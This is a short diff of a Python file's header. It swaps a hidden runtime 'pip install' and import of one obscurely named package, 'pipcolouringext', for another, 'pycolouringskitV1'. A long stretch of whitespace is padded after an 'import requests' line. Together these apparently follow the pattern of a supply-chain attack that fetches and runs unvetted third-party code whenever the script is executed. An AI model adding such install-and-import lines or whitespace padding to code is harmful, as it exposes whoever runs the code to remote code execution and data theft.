@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolouringext")
-import pipcolouringext
+os.system("pip install pycolouringskitV1")
+import pycolouringskitV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
